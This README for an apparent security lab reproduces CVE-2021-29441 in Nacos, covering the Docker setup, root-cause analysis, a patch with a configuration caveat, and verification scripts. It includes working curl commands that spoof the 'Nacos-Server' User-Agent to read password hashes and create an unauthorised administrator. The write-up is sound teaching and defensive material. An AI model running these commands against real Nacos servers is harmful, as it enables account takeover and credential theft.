# CVE-2021-29441 — Nacos authentication bypass via a spoofed `User-Agent`

This folder is the vulnerable-environment part of Lab 1: the launcher, the
exploit, the patch and the verification script for the CVE chosen for the
second half of the assignment.

| Property | Value |
|---|---|
| CVE | **CVE-2021-29441** |
| Component | Alibaba Nacos < 1.4.1 (the `AuthFilter` servlet filter) |
| Class | CWE-290 — Authentication Bypass by Spoofing |
| CVSS 3.1 | **8.6 HIGH** — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Affected | every version before 1.4.1, **when authentication is enabled** |
| Fixed in | 1.4.1 — the switch exists from there, but it defaults to *on*; see §6 |
| OWASP Top 10 | A01:2021 Broken Access Control, A07:2021 Identification and Authentication Failures |
| Vulhub path | `vulhub/nacos/CVE-2021-29441` |

---

## 1. Why this CVE

* The root cause is a **single, quotable design flaw**: the `AuthFilter` trusts a
  request header to decide "this call comes from another Nacos server".
* The exploit is **two `curl` commands** with no payload crafting, which makes
  the before/after comparison unambiguous.
* The impact is not theoretical: the bypass reaches the **user-management API**,
  so the attacker can read the password hashes *and* create an administrator.
* The fix has a genuine wrinkle (see §6): upgrading alone does not close it,
  because the vendor ships the new switch **enabled**.

---

## 2. Files

```
cve/
├── Dockerfile                 # Nacos 1.4.0, authentication ENABLED
├── docker-compose.yml         # http://localhost:8848
├── Dockerfile.fixed           # Nacos 1.4.1 + userAgentAuthWhite=false + server identity
├── docker-compose.fixed.yml   # same port, same auth, only the fix differs
├── exploit.ps1 / exploit.sh   # reproduce (leak + create admin)
├── verify-fix.ps1 / verify-fix.sh   # assert the attack fails + regression check
├── run-all.ps1                # orchestrate the whole cycle, write cve/evidence/
└── README.md                  # this file
```

> **Why not just use `vulhub/nacos:1.4.0`?** Because that image ships
> `nacos.core.auth.enabled=false`. With authentication off *everything* is
> reachable and the `User-Agent` header is irrelevant — that demo would not be
> about the CVE at all. Both of our images therefore set
> `nacos.core.auth.enabled=true`, which is exactly the precondition the advisory
> names ("when configured to use authentication").

---

## 3. Launch

**One command (recommended, Windows)** — vulnerable build → exploit → teardown →
patched build → verify → teardown, with the transcripts saved to `cve/evidence/`:

```powershell
cd cve
powershell -ExecutionPolicy Bypass -File .\run-all.ps1
```

Manual equivalent:

```bash
cd cve
docker compose up -d --build      # first build downloads the 1.4.0 tarball (~100 MB)
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8848/nacos/   # -> 200
```

> Nacos is a Spring Boot application: allow **30–60 s** after `up` before the
> port answers.

---

## 4. Reproduce

```bash
# Windows
powershell -ExecutionPolicy Bypass -File .\cve\exploit.ps1
# Linux / macOS
./cve/exploit.sh
```

or manually:

```bash
# 1. baseline: authentication is on, anonymous access is refused
curl -s -o /dev/null -w '%{http_code}\n' \
  'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
# -> 403  {"status":403,"error":"Forbidden","message":"unknown user!"}

# 2. the bypass: the same request, plus one header
curl -s -H 'User-Agent: Nacos-Server' \
  'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
# -> 200  {"totalCount":1,"pageItems":[{"username":"nacos","password":"$2a$10$..."}]}

# 3. impact: create an administrator without any credentials
curl -s -X POST -H 'User-Agent: Nacos-Server' \
  'http://127.0.0.1:8848/nacos/v1/auth/users?username=pwned&password=Passw0rd123'
# -> 200  {"code":200,"message":"create user ok!","data":null}
```

Measured on the vulnerable build (2026-10-19, full transcript in
`cve/evidence/vulnerable.txt`):

```
1. Sanity check: GET /nacos/                              HTTP 200

2. Baseline: GET /nacos/v1/auth/users  (no header)        HTTP 403
   {"timestamp":"...","status":403,"error":"Forbidden","message":"unknown user!"}

3. Bypass: same request with 'User-Agent: Nacos-Server'   HTTP 200
   {"totalCount":1,"pageNumber":1,"pageItems":[
      {"username":"nacos","password":"$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"}]}
   >>> VULNERABLE: authentication bypassed; the user table and password hashes are readable.

4. Impact: create an admin account through the same bypass
   {"code":200,"message":"create user ok!","data":null}
   >>> VULNERABLE: 'pwned4779' was created without any credentials
```

From there the attacker logs in at `http://127.0.0.1:8848/nacos/` with the
account just created and holds full administrative access (namespaces, configs,
service registry).

---

## 5. Root cause

### 5.1 The defect

When authentication is enabled, every request passes through `AuthFilter`
(`com.alibaba.nacos.core.auth.AuthFilter`). The filter has a short-circuit for
**server-to-server** traffic:

```java
// Nacos 1.4.0, simplified
if (userAgent.equals("Nacos-Server")) {
    return chain.doFilter(request, response);   // skip every auth check
}
```

The short-circuit is justified by the assumption "only a Nacos server would send
this header". That assumption is the bug: **a header is attacker-controlled
data, not an identity**. Anyone can type the string.

So the failure is not "a missing check"; it is a **trust decision made on a
spoofable input** — the textbook shape of CWE-290, Authentication Bypass by
Spoofing. The filter also gave the shortcut more power than it needed: it
skipped *all* authorisation, including the user-management API, which is why the
impact is "any administrative task" rather than "read one config".

### 5.2 Why the configuration matters

The advisory is explicit: this is exploitable *when configured to use
authentication*. Two consequences worth understanding:

* if `nacos.core.auth.enabled=false` (the default, and what the stock Vulhub
  image ships), the bypass is invisible — the server is open anyway, so the
  missing check changes nothing;
* the vulnerability is therefore a **broken access-control design**, not "the
  default config is insecure". Turning auth on is what makes the bypass
  meaningful, and turning auth off is not a fix — it only hides the symptom.

### 5.3 The impact chain

```
spoofed header ──► AuthFilter short-circuit ──► /v1/auth/users
                                             ├─ GET  → user table + bcrypt hashes (offline cracking)
                                             └─ POST → create an administrator
                                                          └─► full console access
```

The hashes are bcrypt (`$2a$10$`), so cracking is slow — but nothing has to be
cracked: creating a *new* administrator is instant and leaves less noise.

---

## 6. The fix, and the wrinkle

`Dockerfile.fixed` builds **Nacos 1.4.1** — the version that puts the hard-coded
`User-Agent` shortcut behind a switch:

```
nacos.core.auth.enable.userAgentAuthWhite=true
```

**1.4.1 ships that switch turned ON** for backwards compatibility with existing
clusters, so a plain version bump does **not** close the hole. We verified it:
on a stock 1.4.1 the spoofed header still returned the user table. The real fix
is therefore two steps:

```diff
-  NACOS_VERSION=1.4.0
+  NACOS_VERSION=1.4.1
+  nacos.core.auth.enable.userAgentAuthWhite=false
```

and, because disabling the whitelist makes 1.4.1 demand a **server identity**
for legitimate internal calls, a third setting is required — otherwise the
server rejects *everything*, console included:

```
nacos.core.auth.server.identity.key=lab1server
nacos.core.auth.server.identity.value=lab1secret
```

With all three in place the same requests are refused:

```bash
curl -s -o /dev/null -w '%{http_code}\n' -H 'User-Agent: Nacos-Server' \
  'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
# -> 403
# {"status":403,"error":"Forbidden",
#  "message":"Invalid server identity key or value, Please make sure set
#             `nacos.core.auth.server.identity.key` and
#             `nacos.core.auth.server.identity.value`, or open
#             `nacos.core.auth.enable.userAgentAuthWhite`"}
```

and the console still answers (`GET /nacos/` → 200), which is what the
regression check is for.

The lesson mirrors the Apache case from the other half of this lab: **"fixed in
version X" is not the same as "fixed".** Read the advisory, read the release
notes, and verify the behaviour yourself.

---

## 7. Verification

```bash
powershell -ExecutionPolicy Bypass -File .\cve\verify-fix.ps1
# or
./cve/verify-fix.sh
```

Measured output:

```
1. Regression check: GET /nacos/
[PASS] console still returns 200

2. Bypass must fail: GET with 'User-Agent: Nacos-Server'
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 -> HTTP 403
[PASS] returns 403 instead of 200
[PASS] no user table in the body

3. Creating an account must fail
[PASS] no 'create user ok'

4. Authentication is still enabled
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 (no credentials) -> HTTP 403
[PASS] anonymous access still refused

RESULT: fix verified -- all checks passed.
```

Check 4 matters as much as the others: "the attack fails because authentication
was switched off" would be a regression disguised as a fix. The script asserts
that anonymous access is *still* refused.

---

## 8. Defence in depth

* Never authorise on a request header. If internal traffic must be recognised,
  use a **secret** the attacker cannot guess (`server.identity.key/value`) or
  mutual TLS, and scope the exemption to the narrowest possible set of paths.
* Keep the bypass switch off (`userAgentAuthWhite=false`) and rotate the server
  identity when a node leaves the cluster.
* Put the console/API behind a network policy — Nacos is normally an internal
  component and has no business being reachable from the internet.
* Alert on `User-Agent: Nacos-Server` arriving from an address that is not a
  known cluster node.
* Treat the console as an administrative plane: separate credentials, 2FA at the
  proxy, audit-log shipping.

---

## 9. References

* GHSA-36hp-jr8h-556f — <https://github.com/advisories/GHSA-36hp-jr8h-556f>
* Nacos issue #4701 / PR #4703 — <https://github.com/alibaba/nacos/issues/4701>, <https://github.com/alibaba/nacos/pull/4703>
* CVE record — <https://www.cve.org/CVERecord?id=CVE-2021-29441>
* Vulhub `nacos/CVE-2021-29441` — <https://github.com/vulhub/vulhub/tree/master/nacos/CVE-2021-29441>
* CWE-290 — <https://cwe.mitre.org/data/definitions/290.html>
